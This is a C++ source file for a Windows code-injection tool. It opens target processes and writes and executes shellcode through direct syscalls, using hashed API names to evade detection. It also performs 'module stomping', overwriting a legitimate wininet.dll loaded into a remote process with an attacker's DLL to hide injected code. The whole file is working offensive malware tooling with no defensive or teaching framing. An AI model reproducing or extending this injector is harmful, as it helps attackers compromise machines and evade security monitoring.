#include "injector.hpp"
#include "dll.hpp"

injectorMethod mainInjector;


    BOOL injectorMethod::closeH(HANDLE toClose) {

        typedef BOOL(WINAPI* CloseHandle_t)(
            HANDLE  hObject
            );
        unsigned char* k = helperHandler.getKernel32();

        wchar_t wK[50];
        size_t convertedChars = 0;

        mbstowcs_s(&convertedChars, wK, 50, (char*)k, _TRUNCATE);
        PVOID pCloseHandle = syscallHandler.getFunctionAddressByHash(wK, 946915847);
        CloseHandle_t myCloseH = (CloseHandle_t)pCloseHandle;
        myCloseH(toClose);
        return 1;

    }

    HANDLE injectorMethod::process(int process_id) {

        std::cout << "-------In injectorMethod::process function-------\n";
        //std::cout << "received int process_id : " << process_id << "\n";
        CLIENT_ID cid = {};
        cid.UniqueProcess = (HANDLE)(UINT_PTR)process_id;
        //std::cout << "cid.unique Process :  " << cid.UniqueProcess;
        cid.UniqueThread = NULL;
        //std::cout << "\ncid.unique Thread :  " << cid.UniqueThread;

        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

        HANDLE hProcess = NULL;

        syscallHandling::SYSCALL_DATA structNtOpenProcess =
            syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 1342423128);

        ssnsysNtOpenProcess = structNtOpenProcess.ssn;
        wsysNtOpenProcess = structNtOpenProcess.syscallAddress;
        std::cout << "\n\n\n\n[+] ssn and syscalls address: \n";
        std::cout << "sycalls adress for NtOpenProcess: " << wsysNtOpenProcess << "\n";
        std::cout << "ssn for NtOpenProcess: " << ssnsysNtOpenProcess << "\n";

        NTSTATUS status = sysNtOpenProcess(
            &hProcess,
            PROCESS_ALL_ACCESS,
            &oa,
            cid
        );
		std::cout << "status after syscall: " << status << "\n";
        if (status != 0 || hProcess == NULL) {
            //std::cout << "[-] NtOpenProcess failed: " << status << "\n";
            return NULL;
        }
		std::cout << "--------Exiting injectorMethod::process function with handle: " << hProcess << "---------\n";
        return hProcess;
    }


    NTSTATUS injectorMethod::wrMem(HANDLE hProcess, LPVOID rBuffer, PVOID shellcode, SIZE_T len_shellcode) {
        //std::cout << "in write Memory func\n\n";
        std::cout << "-------In wrMem function-------\n";


        syscallHandling::SYSCALL_DATA structNtWriteVirtualMemory = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 2515773330);
        wsysNtWriteVirtualMemory = structNtWriteVirtualMemory.syscallAddress;
        std::cout << "syscall adress for NtWriteVirtualMemory: " << wsysNtWriteVirtualMemory << "\n";
        ssnsysNtWriteVirtualMemory = structNtWriteVirtualMemory.ssn;
        std::cout << "ssn for NtWriteVirtualMemory: " << ssnsysNtWriteVirtualMemory;
        SIZE_T bytesWritten = 0;
		std::cout << "executing syscall with hanlde: " << hProcess << " buffer: " << rBuffer << " PVOID shellcode: " << shellcode << " len_shellcode: " << len_shellcode << "\n";
        NTSTATUS status = sysNtWriteVirtualMemory(hProcess, rBuffer, shellcode, len_shellcode, &bytesWritten);
        std::cout << "\nstatus after syscall: " << status << "\n";
        std::cout << "bytes written: " << bytesWritten << "\n";
        std::cout << "\nshellcode len: " << len_shellcode << "\n";

        std::cout << "-------exiting wrMem function and returning status-------\n";
        return status;

    }

    NTSTATUS injectorMethod::protectMem(HANDLE proc, LPVOID buff, SIZE_T len_shellcode) {


        syscallHandling::SYSCALL_DATA structNtProtectVirtualMemory = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 136929992);
        ssnsysNtProtectVirtualMemory = structNtProtectVirtualMemory.ssn;
        wsysNtProtectVirtualMemory = structNtProtectVirtualMemory.syscallAddress;
        //std::cout << "sycalls adress for NtProtectVirtualMemory: " << wsysNtProtectVirtualMemory << "\n";
        //std::cout << "ssn for NtProtectVirtualMemory: " << ssnsysNtProtectVirtualMemory << "\n";


        DWORD oldProtect = 0;
        
        NTSTATUS status = sysNtProtectVirtualMemory(proc, &buff, &len_shellcode, PAGE_EXECUTE_READ, &oldProtect);
        //std::cout << "NtProtectVirtualMemory: " << status << " error: " << GetLastError() << "\n";

        return status;

    }

    NTSTATUS injectorMethod::protectMemFlag(HANDLE proc, LPVOID buff, ULONG flag, SIZE_T len_shellcode) {

        std::cout << "-------In protectMemFlag function-------\n";
        syscallHandling::SYSCALL_DATA structNtProtectVirtualMemory = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 136929992);
        ssnsysNtProtectVirtualMemory = structNtProtectVirtualMemory.ssn;
        wsysNtProtectVirtualMemory = structNtProtectVirtualMemory.syscallAddress;
        std::cout << "sycalls adress for NtProtectVirtualMemory: " << wsysNtProtectVirtualMemory << "\n";
        std::cout << "ssn for NtProtectVirtualMemory: " << ssnsysNtProtectVirtualMemory << "\n";


        DWORD oldProtect = 0;
		
        PVOID baseAddress = buff;
        SIZE_T sizeToProtect = len_shellcode;

        std::cout << "executing syscall with proc: " << proc
            << " base: " << baseAddress
            << " size: " << sizeToProtect
            << " flag: " << flag << "\n";

        // Call using the temporary variables
        NTSTATUS status = sysNtProtectVirtualMemory(proc, &baseAddress, &sizeToProtect, flag, &oldProtect);
        //NTSTATUS status = sysNtProtectVirtualMemory(proc, &buff, &len_shellcode, flag, &oldProtect);
        //std::cout << "NtProtectVirtualMemory: " << status << " error: " << GetLastError() << "\n";
		std::cout << "-----exiting protectMemFlag with status: " << status << "-----\n";
        return status;

    }
    LPVOID injectorMethod::vAlloc(HANDLE hProcess, PVOID addr, SIZE_T shellcode_len) {
		std::cout << "-------In injectorMethod::vAlloc function-------\n";
        //std::cout << "in vAlloc";
        syscallHandling::SYSCALL_DATA structNtAllocateVirtualMemory =
            syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 1737737036);

        wsysNtAllocateVirtualMemory = structNtAllocateVirtualMemory.syscallAddress;
        std::cout << "syscall adress for NtAllocateVirtualMemory: " << wsysNtAllocateVirtualMemory << "\n";
        ssnsysNtAllocateVirtualMemory = structNtAllocateVirtualMemory.ssn;
        std::cout << "ssn for NtAllocateVirtualMemory: " << ssnsysNtAllocateVirtualMemory;

        if (hProcess == (HANDLE)-1) {
            PVOID baseAddr = NULL; // Must be NULL for the kernel to assign an address
            
            NTSTATUS status = sysNtAllocateVirtualMemory(
                hProcess,
                &baseAddr,
                0,
                &shellcode_len,
                MEM_RESERVE | MEM_COMMIT,
                PAGE_READWRITE
            );
        }


        NTSTATUS status = sysNtAllocateVirtualMemory(
            hProcess,
            &addr,
            0,
            &shellcode_len,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE
        );
        std::cout << "returned status from sysNtAllocateVirtualMemory: " << status;

        if (status != 0) {
            std::cout << "NtAllocateVirtualMemory failed: " << status << std::endl;
            return NULL;
        }
        std::cout << "------exiting vAlloc : returning LPVOID to addr" << addr << "  ------\n";
        return addr;

    }
    VOID injectorMethod::vFree(HANDLE hProcess, PVOID address) {
        syscallHandling::SYSCALL_DATA data = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 1192929257); // Hash for NtFreeVirtualMemory
        wsysNtFreeVirtualMemory = data.syscallAddress;
        ssnsysNtFreeVirtualMemory = data.ssn;

        SIZE_T size = 0; // Must be 0 when using MEM_RELEASE
        sysNtFreeVirtualMemory(hProcess, address, size, MEM_RELEASE);
    }
    HANDLE injectorMethod::ntThread(HANDLE proc, LPVOID lpStartAddress, LPVOID lpParameter) {

        std::cout << "-------In ntThread function-------\n";
        HANDLE hThread = NULL;


        syscallHandling::SYSCALL_DATA structNtCreateThreadEx = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 3406569776);
        wsysNtCreateThreadEx = structNtCreateThreadEx.syscallAddress;
        ssnsysNtCreateThreadEx = structNtCreateThreadEx.ssn;
        //std::cout << "sycalls adress for NtCreateThreadEx: " << wsysNtCreateThreadEx << "\n";
        //std::cout << "ssn for NtCreateThreadEx: " << ssnsysNtCreateThreadEx << "\n";
        NTSTATUS status = sysNtCreateThreadEx(
            &hThread,               // Thread handle output
            THREAD_ALL_ACCESS,      // 0x1FFFFF (Access Mask)
            NULL,                   // Object Attributes
            proc,                   // Handle to the remote process
            (LPTHREAD_START_ROUTINE)lpStartAddress, // LoadLibraryW address
            lpParameter,            // Pointer to rBuffer (the DLL path string)
            FALSE,                  // CreateSuspended (FALSE = start immediately)
            0,                      // StackZeroBits
            0,                      // SizeOfStackCommit
            0,                      // SizeOfStackReserve
            NULL                    // BytesBuffer
        );
        std::cout << "\nNtCreateThreadEx status: " << status << "\n";
        //std::cout << "hThread: " << hThread << "\n";

        //NtWaitForSingleObject
        syscallHandling::SYSCALL_DATA structNtWaitForSingleObject = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 1282262588);
        wsysNtWaitForSingleObject = structNtWaitForSingleObject.syscallAddress;
        ssnsysNtWaitForSingleObject = structNtWaitForSingleObject.ssn;
        sysNtWaitForSingleObject(hThread, FALSE, NULL);

		std::cout << "-------Exiting ntThread function with handle: " << hThread << "---------\n";
        return hThread;
    }

    void injectorMethod::waitForSingle(HANDLE addr) {
        syscallHandling::SYSCALL_DATA structNtWaitForSingleObject = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 1282262588);
        wsysNtWaitForSingleObject = structNtWaitForSingleObject.syscallAddress;
        ssnsysNtWaitForSingleObject = structNtWaitForSingleObject.ssn;
        sysNtWaitForSingleObject(addr, FALSE, NULL);
    }

    PVOID injectorMethod::findRemoteModule(HANDLE hProcess, const wchar_t* targetDllName) {

        std::cout << "-------In findRemoteModule function-------\n";
        syscallHandling::SYSCALL_DATA structNtQueryInformationProcess = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 3493133410);
        ssnsysNtQueryInfoProcess = structNtQueryInformationProcess.ssn;
        wsysNtQueryInfoProcess = structNtQueryInformationProcess.syscallAddress;

        // 1. Get Remote PEB Address
        PROCESS_BASIC_INFORMATION pbi;
        PROCESSINFOCLASS pic = ProcessBasicInformation;
        ULONG retLen;
        // Call NtQueryInformationProcess (System Class 0)
        if (sysNtQueryInfoProcess(hProcess, pic, &pbi, sizeof(pbi), &retLen) != 0)
            return NULL;

        // 2. Read the remote PEB structure
        PEB remotePeb;



        syscallHandling::SYSCALL_DATA structNtReadVirtualMemory = syscallHandler.getSyscallDataFromEncoded(helperHandler.getNtdll(), 3258999523);
        ssnsysNtReadVirtualMemory = structNtReadVirtualMemory.ssn;
        wsysNtReadVirtualMemory = structNtReadVirtualMemory.syscallAddress;

        sysNtReadVirtualMemory(hProcess, pbi.PebBaseAddress, &remotePeb, sizeof(PEB), NULL);

        // 3. Read the Ldr Data structure
        PEB_LDR_DATA ldrData;
        sysNtReadVirtualMemory(hProcess, remotePeb.Ldr, &ldrData, sizeof(PEB_LDR_DATA), NULL);

        // 4. Traverse the Module Linked List
        LIST_ENTRY* pListHead = &ldrData.InLoadOrderModuleList;
        LIST_ENTRY* pCurrentNode = ldrData.InLoadOrderModuleList.Flink;

        while (pCurrentNode != pListHead) {
            LDR_DATA_TABLE_ENTRY entry;
            // Read the current module entry from remote memory
            sysNtReadVirtualMemory(hProcess, CONTAINING_RECORD(pCurrentNode, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks), &entry, sizeof(entry), NULL);

            // Read the module name string from remote memory
            wchar_t moduleName[256];
            sysNtReadVirtualMemory(hProcess, entry.BaseDllName.Buffer, moduleName, entry.BaseDllName.Length, NULL);
            moduleName[entry.BaseDllName.Length / sizeof(wchar_t)] = L'\0';

            // Check if it's our target
            if (_wcsicmp(moduleName, targetDllName) == 0) {
				std::cout << "[+] Found target module: " << moduleName << " at base address: " << entry.DllBase << "\n";
				std::cout << "-------exiting findRemoteModule function -----" << "\n";
                return entry.DllBase;
            }

            pCurrentNode = entry.InLoadOrderLinks.Flink;
        }
		std::cout << "didnt find the module in the remote process, returning null \n";
        std::cout << "-------exiting findRemoteModule function -----" << "\n";
        return NULL;
    };
    PVOID injectorMethod::moduleStompingDllRemote(std::wstring targetDllPath, int pid) {
        HANDLE hProcess;
        if (pid == 0) {
            hProcess = (HANDLE)-1;
        }
        else {
			hProcess = mainInjector.process(pid);
        }

        // 1. Load our target DLL into a local buffer
        std::vector<BYTE> dllBuffer = ReadFileToBuffer(std::string(targetDllPath.begin(), targetDllPath.end()));
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBuffer.data();
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dllBuffer.data() + dosHeader->e_lfanew);
		std::wcout << "[+] Size of  " << targetDllPath << " Size: " << dllBuffer.size() << " bytes\n";
        // 2. Load the "Sacrifice" DLL in the remote process
        // We use wininet.dll as the decoy
        wchar_t sacrificePath[] = L"C:\\windows\\system32\\wininet.dll";
        std::string tmp = "C:\\windows\\system32\\wininet.dll";
        std::vector<BYTE> sacrificeBuffer = ReadFileToBuffer(tmp);
        std::cout << "[+] Size of C:\\windows\\system32\\wininet.dll: " << sacrificeBuffer.size() << " bytes\n";

        PVOID remotePathBuf = mainInjector.vAlloc(hProcess, NULL, sizeof(sacrificePath));
        mainInjector.wrMem(hProcess, remotePathBuf, (LPVOID)sacrificePath, sizeof(sacrificePath));

        PVOID pLoadLibraryW = syscallHandler.getFunctionAddressByHash(L"kernel32.dll", 1606414609);
        HANDLE hThread = mainInjector.ntThread(hProcess, (PTHREAD_START_ROUTINE)pLoadLibraryW, remotePathBuf);
        mainInjector.waitForSingle(hThread);

        // 3. Find where the sacrifice DLL landed in the remote process
        HMODULE hRemoteSacrifice = (HMODULE)mainInjector.findRemoteModule(hProcess, L"wininet.dll");
		std::cout << "[+] Sacrifice DLL loaded at: " << hRemoteSacrifice << "\n";
        if (!hRemoteSacrifice) return NULL;

        // 4. PREPARE THE STOMP LOCALLY
        // We create a local "shadow" buffer to fix everything before sending it over
        PVOID localShadow = VirtualAlloc(NULL, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		std::cout << "[+] Allocated local shadow buffer at: " << localShadow << " for preparing the stomp\n";
        // Copy Headers
        memcpy(localShadow, dllBuffer.data(), ntHeaders->OptionalHeader.SizeOfHeaders);

        // Copy Sections
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
            memcpy((BYTE*)localShadow + section[i].VirtualAddress,
                dllBuffer.data() + section[i].PointerToRawData,
                section[i].SizeOfRawData);
        }

        // 5. FIXUPS (Relocations & Imports)
        // IMPORTANT: We rebase the DLL to the REMOTE address, not the local shadow address
        RebaseDllRemote((BYTE*)localShadow, ntHeaders, (uintptr_t)hRemoteSacrifice);
		std::cout << "[+] Rebased DLL for remote base: " << hRemoteSacrifice << "\n";
        ResolveImports((BYTE*)localShadow, ntHeaders);
		std::cout << "[+] Resolved Imports for the DLL\n";

        

        // 6. STOMP: Overwrite the remote wininet.dll with our fixed target DLL
        mainInjector.protectMemFlag(hProcess, hRemoteSacrifice, PAGE_READWRITE, ntHeaders->OptionalHeader.SizeOfImage);
        mainInjector.wrMem(hProcess, hRemoteSacrifice, localShadow, ntHeaders->OptionalHeader.SizeOfImage);
        mainInjector.protectMemFlag(hProcess, hRemoteSacrifice, PAGE_EXECUTE_READ, ntHeaders->OptionalHeader.SizeOfImage);

        std::cout << "[+] Module stomped successfully at " << hRemoteSacrifice << "\n";
        
        /*typedef BOOL(WINAPI* f_DllMain)(HINSTANCE, DWORD, LPVOID);
        auto DllMain = (f_DllMain)((BYTE*)hRemoteSacrifice + ntHeaders->OptionalHeader.AddressOfEntryPoint);
		std::cout << "[+] Calling DllMain at: " << DllMain << "\n";
        if (DllMain((HINSTANCE)hRemoteSacrifice, 1, NULL)) {
            std::cout << "[+] DllMain initialized successfully.\n";
        }
        else {
			std::cout << "[-] DllMain failed to initialize.\n";
        }
        */
        auto& exceptionDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];

        if (exceptionDir.Size > 0) {
            auto* pRuntimeFunctions = reinterpret_cast<PRUNTIME_FUNCTION>(
                (BYTE*)hRemoteSacrifice + exceptionDir.VirtualAddress
                );
            DWORD functionCount = exceptionDir.Size / sizeof(RUNTIME_FUNCTION);

            // RtlAddFunctionTable tells Windows: "If a crash happens in this memory range, 
            // use this table to find the handler."
            if (RtlAddFunctionTable(pRuntimeFunctions, functionCount, (DWORD64)hRemoteSacrifice)) {
                std::cout << "[+] Registered Exception Tables for stomped module.\n";
            }
        }
        return hRemoteSacrifice;
        /* 7. EXECUTE: Call the EntryPoint of the stomped DLL
        PVOID remoteEntryPoint = (PVOID)((BYTE*)hRemoteSacrifice + ntHeaders->OptionalHeader.AddressOfEntryPoint);
        std::cout << "[+] Stomped wininet.dll. returning base Adress: " << remoteEntryPoint << "\n";

        mainInjector.ntThread(hProcess, (PTHREAD_START_ROUTINE)remoteEntryPoint, NULL);

        VirtualFree(localShadow, 0, MEM_RELEASE);
        return remoteEntryPoint;
        */
    }

    HMODULE injectorMethod::myLdrLoadDll(std::wstring dllName) {

        typedef NTSTATUS(NTAPI* f_LdrLoadDll)(PWSTR, PULONG, PUNICODE_STRING, PHANDLE);
        auto pLdrLoadDll = (f_LdrLoadDll)syscallHandler.getFunctionAddressByHash(L"ntdll.dll", 50846499);
        UNICODE_STRING uStr;
        RtlInitUnicodeString(&uStr, dllName.c_str());
        HANDLE hMod = NULL;

        // Load it properly (resolves all 50+ dependencies for .NET)
        NTSTATUS status = pLdrLoadDll(NULL, 0, &uStr, &hMod);
        if (status != 0) return NULL;
		
		return (HMODULE)hMod;
    }



